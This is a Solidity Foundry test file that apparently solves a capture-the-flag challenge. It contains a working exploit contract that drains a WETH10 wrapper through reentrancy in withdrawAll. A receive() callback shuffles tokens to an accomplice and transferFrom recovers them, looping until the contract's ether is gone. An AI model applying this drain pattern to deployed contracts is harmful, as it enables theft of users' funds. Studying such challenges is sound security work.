// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/10-Wthe10/WETH10.sol";

contract WETH10Exploit {
    WETH10 weth;
    address payable bob;

    constructor(WETH10 _weth10, address _bob) payable {
        weth = _weth10;
        bob = payable(_bob);
    }

    function attack() external {
        for (; address(weth).balance != 0;) {
            weth.deposit{value: 1 ether}();
            weth.withdrawAll();

            // Execution passes to weth10, which sends eth to address(this)
            // triggering the receive() function

            weth.transferFrom(bob, address(this), 1 ether);
        }
        (bool success,) = bob.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        weth.transfer(bob, 1 ether);
    }
}

contract Weth10Test is Test {
    WETH10 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth).balance, 10 ether, "weth contract should have 10 ether");

        vm.startPrank(bob);

        // hack time!
        WETH10Exploit exploit = new WETH10Exploit{value: bob.balance}(weth, bob);
        console.log("Exploit address: %s", address(exploit));
        console.log("Exploit balance: %s", address(exploit).balance);
        weth.approve(address(exploit), type(uint256).max);
        exploit.attack();

        vm.stopPrank();
        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}
